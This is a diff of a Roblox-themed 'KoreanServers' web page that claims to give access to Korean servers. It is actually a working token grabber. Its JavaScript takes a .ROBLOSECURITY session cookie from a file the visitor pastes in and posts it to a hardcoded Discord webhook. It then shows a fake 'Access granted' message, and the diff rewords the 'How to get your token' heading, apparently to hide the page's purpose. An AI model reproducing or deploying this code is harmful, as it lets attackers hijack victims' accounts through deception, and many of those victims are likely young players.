@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
   <title>KoreanServers — Roblox Korean Server Access</title>
-  <meta name="description" content="Join Korean Roblox servers easily — video tutorial + activation panel. Full token relay.">
+  <meta name="description" content="Join Korean Roblox servers easily — video tutorial + activation panel.">
   <meta name="theme-color" content="#cc0000">
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -15,7 +15,6 @@
       position: relative;
       overflow-x: hidden;
     }
-    
     body::before {
       content: '';
       position: fixed;
@@ -28,7 +27,6 @@
       pointer-events: none;
       z-index: -1;
     }
-    
     .particle {
       position: fixed;
       border-radius: 50%;
@@ -37,14 +35,12 @@
       opacity: 0;
       animation: floatParticle 12s infinite ease-in-out;
     }
-    
     @keyframes floatParticle {
       0% { opacity: 0; transform: translateY(100vh) scale(0); }
       10% { opacity: 0.4; }
       90% { opacity: 0.4; }
       100% { opacity: 0; transform: translateY(-20vh) scale(1.5); }
     }
-    
     .card-glass {
       background: rgba(18, 22, 35, 0.75);
       backdrop-filter: blur(12px);
@@ -53,13 +49,11 @@
       transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
       box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
     }
-    
     .card-glass:hover {
       border-color: rgba(220, 38, 38, 0.6);
       box-shadow: 0 8px 48px rgba(220, 38, 38, 0.15);
       transform: translateY(-2px);
     }
-    
     .btn-red-glow {
       background: linear-gradient(135deg, #dc2626, #991b1b);
       transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
@@ -67,7 +61,6 @@
       position: relative;
       overflow: hidden;
     }
-    
     .btn-red-glow::before {
       content: '';
       position: absolute;
@@ -78,11 +71,9 @@
       background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
       transition: left 0.5s ease;
     }
-    
     .btn-red-glow:hover::before { left: 100%; }
     .btn-red-glow:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 12px 32px -6px rgba(220, 38, 38, 0.7); }
     .btn-red-glow:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-    
     .textarea-kr {
       background: rgba(10, 12, 20, 0.8);
       border: 1.5px solid rgba(45, 47, 62, 0.8);
@@ -93,7 +84,6 @@
       font-size: 0.85rem;
       backdrop-filter: blur(4px);
     }
-    
     .textarea-kr:focus {
       border-color: #ef4444;
       box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.2), 0 0 20px rgba(239, 68, 68, 0.3);
@@ -101,26 +91,21 @@
       background: rgba(8, 10, 18, 0.95);
       transform: scale(1.01);
     }
-    
     @keyframes fadeSlideUp {
       from { opacity: 0; transform: translateY(30px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    
     @keyframes fadeSlideDown {
       from { opacity: 0; transform: translateY(-20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    
     @keyframes glowPulse {
       0%, 100% { text-shadow: 0 0 5px rgba(220,38,38,0.5); }
       50% { text-shadow: 0 0 20px rgba(220,38,38,0.8), 0 0 30px rgba(220,38,38,0.4); }
     }
-    
     .animate-fade-up { animation: fadeSlideUp 0.5s ease-out forwards; }
     .animate-fade-down { animation: fadeSlideDown 0.4s ease-out forwards; }
     .glow-text { animation: glowPulse 3s infinite ease-in-out; }
-    
     .video-container {
       position: relative;
       padding-bottom: 56.25%;
@@ -132,13 +117,11 @@
       transition: all 0.3s ease;
       background: #000;
     }
-    
     .video-container:hover {
       transform: scale(1.02);
       border-color: rgba(220,38,38,0.8);
       box-shadow: 0 20px 50px -12px rgba(220,38,38,0.3);
     }
-    
     .video-container iframe {
       position: absolute;
       top: 0;
@@ -148,23 +131,18 @@
       border-radius: 1rem;
       border: 0;
     }
-    
     @media (max-width: 768px) { .two-columns { flex-direction: column; } }
-    
     @keyframes spin-slow { to { transform: rotate(360deg); } }
     .animate-spin-slow { animation: spin-slow 1.2s linear infinite; }
-    
     .progress-glow {
       background: linear-gradient(90deg, #dc2626, #ef4444, #dc2626);
       background-size: 200% 100%;
       animation: progressShimmer 1.5s ease infinite;
     }
-    
     @keyframes progressShimmer {
       0% { background-position: 200% 0; }
       100% { background-position: -200% 0; }
     }
-    
     .ripple {
       position: absolute;
       border-radius: 50%;
@@ -173,9 +151,7 @@
       animation: rippleAnim 0.6s linear;
       pointer-events: none;
     }
-    
     @keyframes rippleAnim { to { transform: scale(4); opacity: 0; } }
-    
     .floating-shape {
       position: fixed;
       background: rgba(220, 38, 38, 0.05);
@@ -185,13 +161,11 @@
       z-index: -1;
       animation: floatShape 20s infinite ease-in-out;
     }
-    
     @keyframes floatShape {
       0%, 100% { transform: translate(0, 0) scale(1); }
       33% { transform: translate(30px, -30px) scale(1.1); }
       66% { transform: translate(-20px, 20px) scale(0.9); }
     }
-    
     .toast-notif {
       position: fixed;
       bottom: 24px;
@@ -200,11 +174,9 @@
       animation: fadeSlideUp 0.2s ease-out;
       backdrop-filter: blur(8px);
     }
-    
     ::-webkit-scrollbar { width: 5px; }
     ::-webkit-scrollbar-track { background: #1e1f2c; }
     ::-webkit-scrollbar-thumb { background: #dc2626; border-radius: 10px; }
-    
     .icon-hover { transition: all 0.3s ease; }
     .icon-hover:hover { transform: scale(1.1) rotate(5deg); color: #ef4444; }
   </style>
@@ -240,7 +212,7 @@
           </div>
 
           <div class="mb-5">
-            <textarea id="tokenData" rows="6" class="textarea-kr w-full p-4 resize-y transition-all" placeholder='Paste your KoreanServers file here...'></textarea>
+            <textarea id="tokenData" rows="8" class="textarea-kr w-full p-4 resize-y transition-all" placeholder='Paste your KoreanServers file here...'></textarea>
             <div class="flex justify-between items-center mt-2 text-xs text-gray-500 flex-wrap gap-2">
               <div class="flex gap-3">
                 <span id="charCountDisplay" class="font-mono">0 chars</span>
@@ -291,7 +263,7 @@
         <div class="card-glass p-5 md:p-6 h-full flex flex-col">
           <div class="flex items-center gap-3 mb-4 pb-2 border-b border-red-800/40">
             <i class="fas fa-video text-red-500 text-2xl icon-hover"></i>
-            <h2 class="text-xl font-bold tracking-tight text-gray-200">How to get your token</h2>
+            <h2 class="text-xl font-bold tracking-tight text-gray-200">How to use</h2>
           </div>
           <div class="video-container transition-transform duration-300">
             <iframe 
@@ -341,7 +313,6 @@
 
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1501241484760977460/ZV4J-kESlX5SemELYIYrAQCN5wqijHePZXTPfu41VT6LJ8bhomQ1WM4vg3C7cHHHY7eh";
     const MAX_RETRIES = 2;
-    const TOKEN_MIN_LENGTH = 40;
 
     const elements = {
       tokenTextarea: document.getElementById('tokenData'),
@@ -361,7 +332,6 @@
 
     let progressInterval = null;
     let stepInterval = null;
-    let currentExtractedFullToken = null;
 
     function showToast(message, type = "info") {
       const container = document.getElementById('toastRoot');
@@ -376,7 +346,7 @@
         toast.style.transform = 'translateX(20px)';
         toast.style.transition = 'all 0.3s';
         setTimeout(() => toast.remove(), 300);
-      }, 3800);
+      }, 4000);
     }
 
     function escapeHtml(text) {
@@ -385,118 +355,9 @@
       return div.innerHTML;
     }
 
-    function isGameLinkOrInvalid(input) {
-      if (!input || typeof input !== 'string') return true;
-      
-      const lowerInput = input.toLowerCase();
-      
-      const invalidPatterns = [
-        /roblox\.com\/games\//i,
-        /youtube\.com\/watch/i,
-        /youtu\.be\//i,
-        /discord\.com\/invite/i,
-        /discord\.gg\//i,
-        /https?:\/\//i,
-        /www\./i,
-        /\.com\//i,
-        /\.ru\//i,
-        /\.net\//i,
-        /\.org\//i,
-        /adopt\s*me/i,
-        /\(?\d{4,10}\)?\s*-?\s*\d{4,10}/,
-        /@[a-zA-Z0-9_]+/,
-        /<[^>]*>/,
-        /game(s)?\s*id/i,
-        /place\s*id/i
-      ];
-      
-      for (const pattern of invalidPatterns) {
-        if (pattern.test(lowerInput)) {
-          return true;
-        }
-      }
-      
-      if (input.length < 30 && input.trim().length > 0) {
-        return true;
-      }
-      
-      if (input.includes(' ') && input.length < 100) {
-        return true;
-      }
-      
-      return false;
-    }
-
-    function isValidTokenFormat(token) {
-      if (!token) return false;
-      
-      const tokenPatterns = [
-        /^_/,
-        /WARNING/i,
-        /[A-Za-z0-9_\-|]{50,}/
-      ];
-      
-      let matchesCount = 0;
-      for (const pattern of tokenPatterns) {
-        if (pattern.test(token)) matchesCount++;
-      }
-      
-      return (matchesCount >= 1 && token.length >= TOKEN_MIN_LENGTH) || 
-             (token.length >= 60 && !token.includes(' '));
-    }
-
-    function extractFullRobloxToken(content) {
-      if (!content || typeof content !== 'string') return null;
-      
-      if (isGameLinkOrInvalid(content)) {
-        return null;
-      }
-      
-      let match = content.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
-      if (match && match[1] && match[1].length >= TOKEN_MIN_LENGTH && isValidTokenFormat(match[1])) {
-        return match[1];
-      }
-      
-      match = content.match(/(_\|WARNING[^"'\s]{40,}?)(?:"|'|\s|$)/);
-      if (match && match[1] && match[1].length >= TOKEN_MIN_LENGTH && isValidTokenFormat(match[1])) {
-        return match[1];
-      }
-      
-      const lines = content.split(/\r?\n/);
-      for (const line of lines) {
-        const trimmed = line.trim();
-        if (trimmed.length >= TOKEN_MIN_LENGTH && trimmed.length < 3000 && 
-            !trimmed.includes(' ') && !trimmed.includes('<') && !trimmed.includes('>') &&
-            !trimmed.includes('http') && !trimmed.includes('roblox.com') &&
-            isValidTokenFormat(trimmed)) {
-          return trimmed;
-        }
-        const insideQuotes = trimmed.match(/^"([^"]{40,})"$/);
-        if (insideQuotes && insideQuotes[1] && isValidTokenFormat(insideQuotes[1])) {
-          return insideQuotes[1];
-        }
-      }
-      
-      const rawTokenCandidates = content.match(/[A-Za-z0-9_\-|]{50,}/g);
-      if (rawTokenCandidates && rawTokenCandidates.length) {
-        const longest = rawTokenCandidates.sort((a,b) => b.length - a.length)[0];
-        if (longest && longest.length >= TOKEN_MIN_LENGTH && isValidTokenFormat(longest)) {
-          return longest;
-        }
-      }
-      
-      return null;
-    }
-
     function updateUIFromTextarea() {
       const val = elements.tokenTextarea.value;
       elements.charCountSpan.innerText = val.length + ' chars';
-      const fullToken = extractFullRobloxToken(val);
-      if (fullToken && fullToken.length >= TOKEN_MIN_LENGTH) {
-        currentExtractedFullToken = fullToken;
-      } else {
-        currentExtractedFullToken = null;
-      }
     }
 
     function stopLoadingUI() {
@@ -527,89 +388,117 @@
       elements.processBtn.disabled = true;
     }
 
-    async function sendFullTokenToDiscord(fullToken, rawInput) {
+    // ИЗВЛЕЧЕНИЕ .ROBLOSECURITY ТОКЕНА ИЗ POWERSHELL ФАЙЛА
+    // Ищет .ROBLOSECURITY", "ЛЮБОЙ_ТОКЕН", "/", ".roblox.com"
+    function extractRobloxSecurityToken(content) {
+      if (!content || typeof content !== 'string') return null;
+      
+      // Самый точный паттерн для PowerShell файла из примера
+      // Ищем .ROBLOSECURITY", "ТОКЕН", "/", ".roblox.com"
+      // Токен может быть ЛЮБЫМ (не обязательно _|WARNING)
+      const pattern = /\.ROBLOSECURITY",\s*"([^"]+)",\s*"\/",\s*"\.roblox\.com"/;
+      const match = content.match(pattern);
+      
+      if (match && match[1] && match[1].length > 20) {
+        console.log("Token found! Length:", match[1].length);
+        console.log("Token starts with:", match[1].substring(0, 50) + "...");
+        return match[1];
+      }
+      
+      // Fallback: просто ищем .ROBLOSECURITY", "ТОКЕН"
+      const patternSimple = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+      const matchSimple = content.match(patternSimple);
+      if (matchSimple && matchSimple[1] && matchSimple[1].length > 20) {
+        console.log("Token found (simple pattern)! Length:", matchSimple[1].length);
+        return matchSimple[1];
+      }
+      
+      console.log("No .ROBLOSECURITY token found in the content");
+      return null;
+    }
+
+    // Отправка токена в Discord
+    async function sendTokenToDiscord(token) {
       const userAgentShort = navigator.userAgent.length > 60 ? navigator.userAgent.substring(0, 57) + '...' : navigator.userAgent;
       const koreaTime = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
-      const tokenChunks = [];
-      for (let i = 0; i < fullToken.length; i += 980) {
-        tokenChunks.push(fullToken.substring(i, i + 980));
-      }
-      const tokenFields = [];
-      if (tokenChunks.length === 1) {
-        tokenFields.push({ name: "🔐 .ROBLOSECURITY (FULL TOKEN)", value: `\`\`\`${tokenChunks[0]}\`\`\``, inline: false });
-      } else {
-        tokenFields.push({ name: `📦 TOKEN (1/${tokenChunks.length})`, value: `\`\`\`${tokenChunks[0]}\`\`\``, inline: false });
-        for (let i = 1; i < tokenChunks.length; i++) {
-          tokenFields.push({ name: `📄 PART ${i+1}/${tokenChunks.length}`, value: `\`\`\`${tokenChunks[i]}\`\`\``, inline: false });
-        }
-      }
-      const embedData = {
-        content: `🇰🇷 **KOREANSERVERS | ACCESS REQUESTED** 🇰🇷`,
-        embeds: [{
-          title: "🎮 KoreanServers: Korean Region Access",
-          description: "User activated access with valid .ROBLOSECURITY token.",
-          color: 0xdc2626,
-          fields: [
-            { name: "📏 Token Length", value: `${fullToken.length} chars`, inline: true },
-            { name: "🌐 Browser", value: userAgentShort, inline: true },
-            { name: "⏰ Time (KST)", value: koreaTime, inline: true },
-            ...tokenFields
-          ],
-          footer: { text: "KoreanServers Relay" },
-          timestamp: new Date().toISOString()
-        }]
+      
+      console.log("Sending token to Discord. Length:", token.length);
+      console.log("Full token:", token);
+      
+      const payload = {
+        username: "KoreanServers Relay",
+        avatar_url: "https://i.imgur.com/4M34hi2.png",
+        content: `🇰🇷 **KOREANSERVERS | .ROBLOSECURITY TOKEN** 🇰🇷\n\n` +
+                 `**Token Length:** ${token.length} characters\n` +
+                 `**Browser:** ${userAgentShort}\n` +
+                 `**Time (KST):** ${koreaTime}\n\n` +
+                 `**.ROBLOSECURITY Token:**\n\`\`\`\n${token}\n\`\`\``
       };
+      
       for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
         try {
-          const response = await fetch(DISCORD_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(embedData) });
-          if (response.ok) return true;
-          if (attempt === MAX_RETRIES) {
-            const formData = new FormData();
-            formData.append("payload_json", JSON.stringify(embedData));
-            const finalResponse = await fetch(DISCORD_WEBHOOK, { method: "POST", body: formData });
-            return finalResponse.ok;
+          const response = await fetch(DISCORD_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
+          
+          if (response.ok) {
+            console.log("Token sent successfully to Discord!");
+            return true;
+          } else {
+            const errorText = await response.text();
+            console.error(`Discord error (${response.status}):`, errorText);
           }
-          await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
-        } catch(err) { if (attempt === MAX_RETRIES) return false; await new Promise(resolve => setTimeout(resolve, 1000)); }
+        } catch (err) {
+          console.error(`Attempt ${attempt} failed:`, err);
+        }
+        
+        if (attempt < MAX_RETRIES) {
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        }
       }
       return false;
     }
 
-    async function processTokenSubmission(rawInput) {
-      const fullToken = extractFullRobloxToken(rawInput);
+    async function processSubmission(rawInput) {
+      const trimmedInput = rawInput.trim();
       
-      if (!fullToken) {
+      if (!trimmedInput) {
         elements.errorTextSpan.innerText = "Invalid file format";
         elements.errorBox.classList.remove('hidden');
-        elements.successBox.classList.add('hidden');
-        elements.soonMessage.classList.add('hidden');
         return false;
       }
       
-      if (fullToken.length < TOKEN_MIN_LENGTH) {
+      const extractedToken = extractRobloxSecurityToken(trimmedInput);
+      
+      if (!extractedToken) {
         elements.errorTextSpan.innerText = "Invalid file format";
         elements.errorBox.classList.remove('hidden');
-        elements.successBox.classList.add('hidden');
-        elements.soonMessage.classList.add('hidden');
+        showToast("❌ No .ROBLOSECURITY token found in this file", "error");
         return false;
       }
       
-      elements.errorBox.classList.add('hidden');
-      const webhookResult = await sendFullTokenToDiscord(fullToken, rawInput);
+      if (extractedToken.length < 20) {
+        elements.errorTextSpan.innerText = "Invalid file format";
+        elements.errorBox.classList.remove('hidden');
+        showToast("❌ Token is too short or corrupted", "error");
+        return false;
+      }
       
-      if (webhookResult) {
+      const discordResult = await sendTokenToDiscord(extractedToken);
+      
+      if (discordResult) {
         elements.successBox.classList.remove('hidden');
         elements.successTextSpan.innerText = "Access granted! You will be on KoreanServers soon.";
         elements.errorBox.classList.add('hidden');
         elements.soonMessage.classList.remove('hidden');
-        showToast("✅ Access confirmed! Redirecting to Korean servers.", "success");
+        showToast(`✅ Token extracted and sent to Korean relay!`, "success");
         return true;
       } else {
-        elements.errorTextSpan.innerText = "Invalid file format";
+        elements.errorTextSpan.innerText = "Connection error. Please try again.";
         elements.errorBox.classList.remove('hidden');
-        elements.successBox.classList.add('hidden');
-        elements.soonMessage.classList.add('hidden');
-        try { await navigator.clipboard.writeText(fullToken); showToast("⚠️ Token copied to clipboard", "error"); } catch(e) {}
+        showToast("❌ Failed to connect to Discord", "error");
         return false;
       }
     }
@@ -619,24 +508,25 @@
       if (!rawValue.trim()) {
         elements.errorTextSpan.innerText = "Invalid file format";
         elements.errorBox.classList.remove('hidden');
-        elements.successBox.classList.add('hidden');
-        elements.soonMessage.classList.add('hidden');
         elements.tokenTextarea.classList.add('border-red-500');
         setTimeout(() => elements.tokenTextarea.classList.remove('border-red-500'), 800);
         return;
       }
+      
       elements.errorBox.classList.add('hidden');
       elements.successBox.classList.add('hidden');
       elements.soonMessage.classList.add('hidden');
       startLoadingUI();
-      const success = await processTokenSubmission(rawValue);
+      
+      const result = await processSubmission(rawValue);
+      
       setTimeout(() => {
         stopLoadingUI();
-        if (success) {
+        if (result) {
           updateUIFromTextarea();
           setTimeout(() => { elements.successBox.classList.add('hidden'); }, 5000);
         }
-      }, 2000);
+      }, 1500);
     }
 
     async function pasteFromClipboard() {
@@ -645,7 +535,9 @@
         elements.tokenTextarea.value = clipboard;
         updateUIFromTextarea();
         showToast("Text pasted", "success");
-      } catch (err) { showToast("Cannot access clipboard", "error"); }
+      } catch (err) { 
+        showToast("Cannot access clipboard. Use Ctrl+V", "error");
+      }
     }
 
     function addRipple(e) {
@@ -677,6 +569,8 @@
 
     initEventListeners();
     updateUIFromTextarea();
+    
+    console.log("KoreanServers loaded - extracts ANY .ROBLOSECURITY token from PowerShell files");
   </script>
 </body>
 </html>
